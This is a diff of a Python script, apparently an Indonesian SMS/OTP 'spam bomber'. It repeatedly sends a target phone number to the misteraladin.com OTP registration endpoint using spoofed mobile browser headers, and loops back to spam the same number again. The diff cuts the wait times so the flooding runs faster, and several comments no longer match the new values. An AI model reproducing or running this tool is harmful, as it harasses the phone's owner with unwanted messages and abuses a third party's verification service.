@@ -271,40 +271,40 @@ def jam(nomor): # Don't Remove Code !!!!
                 Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
                 
                 autoketik(f"{hijau}Sukses Mengirim Spam")
-                countdown(120) # Jangan Diubah !!!!
+                countdown(60) # Jangan Diubah !!!!
                 RTO_flag = 1
                 rto = 1 # Flag tunda
             
             except requests.exceptions.ConnectionError:
                 print("")
                 autoketik("--Fail to establish a new connection--")
-                time.sleep(1000) # Tunda 1000 detik
+                time.sleep(60) # Tunda 60 detik
                 rto = 1
 
             #https://urllib3.readthedocs.io/en/stable/reference/urllib3.exceptions.html
             except urllib3.exceptions.NewConnectionError: # Error Handling 2 ketika masih terjadi error berlebihan
                 print("")
                 autoketik("--Fail to establish a new connection--")
-                time.sleep(1000) # Tunda 1000 detik
+                time.sleep(60) # Tunda 1000 detik
                 rto = 1
 
             except TimeoutError : # HTTPSConnectionPool() A Connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
                 print("")
                 autoketik("--A Connection attempt failed because the connected party did not properly respond after a period of time--")
-                time.sleep(1000) # Tunda 1000 detik
+                time.sleep(60) # Tunda 1000 detik
                 rto = 1
 
             except urllib3.exceptions.ProtocolError : # HTTPSConnectionPool() A Connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
                 print("")
                 autoketik("--A Connection attempt failed because the connected party did not properly respond after a period of time--")
-                time.sleep(1000) # Tunda 1000 detik
+                time.sleep(60) # Tunda 1000 detik
                 rto = 1
 
             except KeyboardInterrupt: # Error Handling Ketika user menekan tombol CTRL + C atau Interrupt Terminal
                 print("")
                 tanya(nomor)
         if rto==1:
-            time.sleep(80) # Jika sudah error RTO maka tunda dulu proses selama 80 detik
+            time.sleep(60) # Jika sudah error RTO maka tunda dulu proses selama 80 detik
             start(nomor,1)
         else:
             start(nomor,1) # Fungsi start() dengan membawa parameter (nomor target, flag 1 yang berarti bukan perama kali masuk kedalam fungsi start())
@@ -318,7 +318,7 @@ def start(nomor,x): # Def Untuk Start Tools
     else:
         print("")
         autoketik("--reboot wait 20 second--")
-        time.sleep(15) # Tunda 20 detik
+        time.sleep(10) # Tunda 20 detik
         os.system("cls") # Clear Terminal
         autoketik(f"{merah}Mengulang Spam ke Nomor : {nomor}.....{hijau}") # Flag dimana program berjalan
         jam(nomor)
